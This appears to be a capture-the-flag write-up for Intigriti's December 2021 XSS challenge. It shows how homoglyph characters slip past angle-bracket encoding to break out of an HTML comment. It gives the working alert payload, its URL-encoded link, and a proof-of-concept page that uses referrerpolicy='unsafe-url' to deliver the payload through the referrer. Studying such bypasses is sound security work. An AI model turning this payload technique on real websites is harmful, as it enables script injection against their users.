![xmas](https://user-images.githubusercontent.com/59454895/147423668-176bed51-66d4-4cb1-8e38-8670dc87995c.PNG)
## Let's start
The challenge comes with an input field and a parameter called " Stay open " to avoid repeating an animation, first of all I tried to insert a simple payload like <script>alert(document.domain)</script> to understand what the starting point was.

![xss2](https://user-images.githubusercontent.com/59454895/147423813-7a3e8cf9-6ac7-41c0-9c9c-07d6921a0cdf.png)
From the screen I showed you above, you can see two pieces of information, first of all the content is reflected inside an html comment.
This is really important because with a simple payload like ``` --><script>alert(document.domain)</script>``` we can escape from the comment and execute our xss payload, 
but there is a problem, as you can see from the screen  the characters ```<``` and ```>``` are encoded.

At this point I tried to think of various bypasses until I came up with an idea based on a previously played ctf.

## Homoglyph characters
Homoglyph are character that look alike but are not the same, so it's possible to use characters that looks the same but are interpreted 
differently from the server, here is an example:

![xss2](https://user-images.githubusercontent.com/59454895/147424278-b465ff5a-24cd-4a12-8843-67b5fa89f4b7.png)

This is how my input got interpreted, but let's see the content inside the html comment.

![xss3](https://user-images.githubusercontent.com/59454895/147424325-9d3b23c2-ed52-433d-bb4d-fe4dbf20a305.PNG)

As you can see, especially from the latest D. The content looks the same but is interpreted differently, 
this is really important because we can use this type of characters to bypass the control on ```<``` and ```>```

## Final Payload

To build the final payload I simply used Homoglyph characters regarding the ```<``` and the ```>```, in this way I was able to close the html comment and escape in order to execute XSS.

![xss4](https://user-images.githubusercontent.com/59454895/147424604-cea7b20b-1f05-4167-9beb-f5743c3dfd41.PNG)

To be sure, I url encoded the whole payload.

https://challenge-1221.intigriti.io/challenge/index.php?payload=--%EF%B9%A5%EF%B9%A4script%EF%B9%A5alert(document.domain)%EF%B9%A4/script%EF%B9%A5

Just to be clear, clicking the link will not execute the xss, but you will need to enter ``` --﹥﹤script﹥alert(document.domain)﹤/script﹥  ``` inside the input field ( we will see after how to not make this case a self-xss )

![comment2](https://user-images.githubusercontent.com/59454895/147426340-b566f6b1-d134-46f7-8e43-61a93f1d98aa.PNG)


As you can see, I was able to get out of the Html comment, and execute my payload.


## Final Poc

Now that we know how to execute the xss it's not over, in fact the scenario described is that of a Self-XSS, which is no good.
To avoid this problem, I wrote this simple POC:

```html

<html>
  <body>
    <a href="https://challenge-1221.intigriti.io/challenge/index.php?payload=xss" referrerpolicy="unsafe-url">Click here </a>
  </body>
</html>


```

The only interesting part is the ```referrerpolicy="unsafe-url"``` parameter that is needed to send the origin, path, and query string when performing any request, regardless of security.
This means that this policy will leak potentially-private information (in this case our payload) from HTTPS resource URLs to insecure origins, without this parameter it would not be possible to populate the referrer header from an external origin and execute XSS.


The last step is to host our code and insert the payload described above in the url:

https://mydomain/xmasxss.html?payload=--%EF%B9%A5%EF%B9%A4script%EF%B9%A5alert(document.domain)%EF%B9%A4/script%EF%B9%A5




